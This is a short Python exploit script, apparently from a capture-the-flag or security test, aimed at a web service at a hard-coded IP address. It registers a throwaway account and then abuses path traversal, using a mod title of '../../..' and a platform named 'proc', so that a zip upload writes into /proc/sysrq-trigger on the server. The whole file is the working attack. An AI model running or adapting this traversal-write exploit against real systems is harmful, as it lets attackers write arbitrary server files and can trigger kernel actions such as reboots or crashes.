import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = "http://144.79.188.39:36310"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u
tok,u=fresh()
# write 'h' to /proc/sysrq-trigger (harmless). storage_dir=/proc, filename=sysrq-trigger
pid=pf.create_platform(tok,"proc",name="z"); mid=pf.create_mod(tok,"../../..",title="z"); bid=pf.create_build(tok,mid,pid)
r=pf.upload_zip(tok,mid,bid,{"sysrq-trigger": b"h"})
print("write /proc/sysrq-trigger 'h' ->", r.status_code, r.text[:120])
